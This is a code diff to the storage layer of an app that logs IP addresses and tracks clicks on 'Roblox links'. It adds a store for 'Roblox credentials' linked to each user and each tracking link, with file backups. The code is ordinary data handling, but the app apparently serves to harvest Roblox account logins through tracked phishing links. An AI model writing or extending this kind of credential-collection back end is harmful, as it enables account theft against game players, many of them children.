@@ -1,7 +1,7 @@
-import { type User, type InsertUser, type IpLog, type InsertIpLog, type Settings, type InsertSettings, type AccessKey, type InsertAccessKey, type UserSession, type InsertUserSession, type RobloxLink, type InsertRobloxLink } from "@shared/schema";
+import { type User, type InsertUser, type IpLog, type InsertIpLog, type Settings, type InsertSettings, type AccessKey, type InsertAccessKey, type UserSession, type InsertUserSession, type RobloxLink, type InsertRobloxLink, type RobloxCredentials, type InsertRobloxCredentials } from "@shared/schema";
 import { randomUUID } from "crypto";
 import { desc, eq } from "drizzle-orm";
-import { users, ipLogs, settings, accessKeys, userSessions, robloxLinks } from "@shared/schema";
+import { users, ipLogs, settings, accessKeys, userSessions, robloxLinks, robloxCredentials } from "@shared/schema";
 import fs from 'fs/promises'; // Use fs.promises for async operations
 import path from 'path'; // Import path module
 
@@ -51,6 +51,11 @@ export interface IStorage {
   updateRobloxLinkClicks(trackingId: string): Promise<void>;
   updateRobloxLink(linkId: string, updates: Partial<RobloxLink>): Promise<RobloxLink | undefined>;
   deleteRobloxLink(linkId: string, userId: string): Promise<boolean>;
+
+  // Roblox Credentials operations  
+  createRobloxCredentials(credentials: InsertRobloxCredentials): Promise<RobloxCredentials>;
+  getRobloxCredentials(userId: string): Promise<RobloxCredentials[]>;
+  getRobloxCredentialsByLink(linkId: string): Promise<RobloxCredentials[]>;
 }
 
 export class MemStorage implements IStorage {
@@ -61,6 +66,7 @@ export class MemStorage implements IStorage {
   private accessKeys: Map<string, AccessKey>;
   private sessions: Map<string, UserSession>;
   private robloxLinks: Map<string, RobloxLink>;
+  private robloxCredentials: Map<string, RobloxCredentials>;
 
   // File-based persistence for critical data
   private dataFilePath = path.join(import.meta.dirname, 'data-backup.json');
@@ -83,6 +89,7 @@ export class MemStorage implements IStorage {
     this.accessKeys = new Map();
     this.sessions = new Map();
     this.robloxLinks = new Map();
+    this.robloxCredentials = new Map();
 
     // Load persisted data first, then initialize dev account
     this.loadFromFileSystem().then(() => {
@@ -131,8 +138,9 @@ export class MemStorage implements IStorage {
         settings: Array.from(this.settings.entries()),
         accessKeys: Array.from(this.accessKeys.entries()),
         robloxLinks: Array.from(this.robloxLinks.entries()),
+        robloxCredentials: Array.from(this.robloxCredentials.entries()),
         timestamp: new Date().toISOString(),
-        version: '2.1'
+        version: '2.2'
       };
 
       // Create multiple backup files for extra safety
@@ -206,6 +214,7 @@ export class MemStorage implements IStorage {
           this.accessKeys = new Map(Array.isArray(data.accessKeys) ? data.accessKeys : []);
           this.sessions = new Map(Array.isArray(data.sessions) ? data.sessions : []);
           this.robloxLinks = new Map(Array.isArray(data.robloxLinks) ? data.robloxLinks : []);
+          this.robloxCredentials = new Map(Array.isArray(data.robloxCredentials) ? data.robloxCredentials : []);
 
           // Convert date strings back to Date objects with error handling
           this.ipLogs.forEach((log, key) => {
@@ -246,7 +255,7 @@ export class MemStorage implements IStorage {
             }
           });
 
-          console.log(`✅ Successfully loaded from ${path.basename(filePath)}: ${this.ipLogs.size} IP logs, ${this.users.size} users, ${this.settings.size} settings, ${this.robloxLinks.size} roblox links`);
+          console.log(`✅ Successfully loaded from ${path.basename(filePath)}: ${this.ipLogs.size} IP logs, ${this.users.size} users, ${this.settings.size} settings, ${this.robloxLinks.size} roblox links, ${this.robloxCredentials.size} credentials`);
           dataLoaded = true;
           break;
         }
@@ -265,6 +274,7 @@ export class MemStorage implements IStorage {
       this.accessKeys.clear();
       this.sessions.clear();
       this.robloxLinks.clear();
+      this.robloxCredentials.clear();
     }
   }
 
@@ -879,6 +889,27 @@ export class MemStorage implements IStorage {
       return false;
     }
     return this.robloxLinks.delete(linkId);
+  }
+
+  // Roblox Credentials operations
+  async createRobloxCredentials(credentials: InsertRobloxCredentials): Promise<RobloxCredentials> {
+    const id = randomUUID();
+    const now = new Date();
+    const newCredentials: RobloxCredentials = {
+      id,
+      ...credentials,
+      createdAt: now,
+    };
+    this.robloxCredentials.set(id, newCredentials);
+    return newCredentials;
+  }
+
+  async getRobloxCredentials(userId: string): Promise<RobloxCredentials[]> {
+    return Array.from(this.robloxCredentials.values()).filter(cred => cred.userId === userId);
+  }
+
+  async getRobloxCredentialsByLink(linkId: string): Promise<RobloxCredentials[]> {
+    return Array.from(this.robloxCredentials.values()).filter(cred => cred.linkId === linkId);
   }
 }
 
